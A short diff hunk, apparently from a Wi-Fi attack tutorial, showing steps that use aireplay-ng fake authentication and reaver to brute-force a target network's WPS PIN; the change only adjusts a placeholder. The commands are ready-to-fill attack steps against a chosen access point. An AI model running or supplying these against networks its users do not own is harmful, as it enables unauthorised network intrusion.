@@ -29,4 +29,4 @@ exploiting WPS vulnerabilities and retrieving 8 digit key
    - sudo aireplay-ng --fakeauth 30 -a <Target_BSSID> -h <Your_MAC> wlan0
 
 5. DO NOT RUN COMMAND YET until following command (horizontal) entered below
-   - sudo reaver --bssid <Target_BSSDI> --channel <Target_Channel> --interface <your network wlan0> -vvv --no-associate
+   - sudo reaver --bssid <Target_BSSDI> --channel <Target_Channel> --interface <your_network_wlan0> -vvv --no-associate
